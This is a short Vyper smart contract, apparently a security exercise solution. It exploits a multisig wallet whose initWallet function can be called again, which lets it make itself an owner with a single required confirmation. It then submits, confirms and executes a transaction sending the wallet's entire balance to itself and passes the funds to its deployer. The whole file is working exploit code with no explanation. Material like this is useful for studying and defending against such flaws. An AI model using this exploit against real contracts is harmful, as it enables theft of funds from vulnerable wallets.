# @version ^0.3.7

interface IWallet:
    def getTransactionCount() -> uint256: view
    def initWallet(
        _owners: DynArray[address, 2],
        _numConfirmationsRequired: uint256,
    ): nonpayable
    def submitTransaction(
        _to: address,
        _value: uint256,
        _data: Bytes[32],
    ): nonpayable
    def confirmTransaction(_txIndex: uint256): nonpayable
    def executeTransaction(_txIndex: uint256): nonpayable

owner: immutable(address)

wallet: IWallet

@external
@payable
def __init__(_wallet: IWallet):
    owner = msg.sender
    self.wallet = _wallet

@external
def attack():
    assert msg.sender == owner, "!owner"
    owners: DynArray[address, 2] = [self, msg.sender]
    num_confirmations: uint256 = 1
    self.wallet.initWallet(owners, num_confirmations)
    self.wallet.submitTransaction(  
        self,
        self.wallet.address.balance,
        b"",
    )
    tx_index: uint256 = self.wallet.getTransactionCount() - 1
    self.wallet.confirmTransaction(tx_index)
    self.wallet.executeTransaction(tx_index)
    send(msg.sender, self.balance)

@external
@payable
def __default__():
    pass
